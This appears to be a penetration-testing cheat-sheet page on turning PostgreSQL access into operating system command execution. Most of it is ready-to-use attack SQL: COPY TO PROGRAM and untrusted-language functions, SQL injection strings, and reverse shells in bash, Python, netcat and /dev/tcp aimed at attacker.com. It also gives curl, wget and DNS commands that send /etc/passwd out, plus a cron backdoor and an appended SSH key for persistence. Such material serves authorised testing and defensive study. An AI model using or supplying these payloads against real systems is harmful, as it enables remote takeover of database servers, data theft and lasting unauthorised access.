---
title: Command Execution
description: Executing operating system commands through PostgreSQL
category: Advanced Techniques
order: 18
tags: ["command execution", "rce", "copy program"]
lastUpdated: 2025-12-07
---

## Command Execution

PostgreSQL provides several methods to execute operating system commands, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### COPY TO/FROM PROGRAM

The most common method (PostgreSQL 9.3+, requires superuser):

```sql
-- Execute command and capture output
CREATE TABLE cmd_output (output TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
DROP TABLE cmd_output;

-- One-liner for command execution
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
```

### Reverse Shell Examples

```sql
-- Bash reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';

-- Python reverse shell
COPY (SELECT '') TO PROGRAM 'python -c ''import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''';

-- Netcat reverse shell
COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash attacker.com 4444';

-- Using mkfifo
COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f';
```

### Using Extensions

#### Creating Custom Functions (C Language)

If you can load extensions:

```sql
-- Create function mapping to libc system()
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
AS '/lib/x86_64-linux-gnu/libc.so.6', 'system'
LANGUAGE C STRICT;

-- Execute command
SELECT system('id');
```

**Note:** This technique may not work on modern PostgreSQL due to security restrictions.

#### Using PL/Python

If `plpython3u` extension is installed:

```sql
-- Create extension (requires superuser)
CREATE EXTENSION plpython3u;

-- Create function to execute commands
CREATE OR REPLACE FUNCTION cmd(cmd TEXT) RETURNS TEXT AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

-- Execute
SELECT cmd('id');
SELECT cmd('whoami');
SELECT cmd('cat /etc/passwd');
```

#### Using PL/Perl

If `plperlu` extension is installed:

```sql
-- Create extension
CREATE EXTENSION plperlu;

-- Create function
CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
my $cmd = shift;
return `$cmd`;
$$ LANGUAGE plperlu;

-- Execute
SELECT cmd('id');
```

#### Using PL/Tcl

```sql
-- Create extension
CREATE EXTENSION pltclu;

-- Create function
CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
return [exec $1]
$$ LANGUAGE pltclu;

-- Execute
SELECT cmd('id');
```

### File Descriptor Hijacking

Using `/dev/tcp` (on systems that support it):

```sql
COPY (SELECT '') TO PROGRAM 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done';
```

### Injection Examples

```sql
-- Basic command execution
'; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd--

-- Reverse shell
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'--

-- Using PL/Python (if available)
'; CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS TEXT AS $$ import os; return os.popen(cmd).read() $$ LANGUAGE plpython3u; SELECT exec('id')--

-- Exfiltrate data via DNS
'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'--
```

### Data Exfiltration via Command Execution

```sql
-- Send data over HTTP
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(cat /etc/passwd | base64)';

-- Send data over DNS
COPY (SELECT '') TO PROGRAM 'for line in $(cat /etc/passwd); do nslookup $line.attacker.com; done';

-- Using wget
COPY (SELECT '') TO PROGRAM 'wget --post-data="$(cat /etc/passwd)" http://attacker.com/collect';
```

### Persistence

```sql
-- Add cron job (requires privilege escalation - postgres user cannot write to /etc/cron.d)
COPY (SELECT '') TO PROGRAM 'echo "* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"" > /tmp/backdoor.cron';

-- Add SSH key (tee reads SELECT output from stdin)
COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO PROGRAM 'tee -a ~/.ssh/authorized_keys';
```

**Note:** The postgres OS user typically runs with limited privileges. Writing to system directories like `/etc/cron.d/` requires root access. These techniques may require additional privilege escalation or only work in misconfigured environments.

### Checking Available Methods

```sql
-- Check for untrusted language extensions
SELECT * FROM pg_extension WHERE extname LIKE 'pl%u';

-- Check PostgreSQL version (COPY PROGRAM requires 9.3+)
SELECT version();

-- Check if superuser
SELECT current_setting('is_superuser');
```

### Notes

- COPY PROGRAM requires superuser privileges
- Commands execute as the `postgres` OS user
- Network access may be restricted by firewalls
- SELinux/AppArmor may prevent command execution
- Modern PostgreSQL restricts loading arbitrary shared libraries
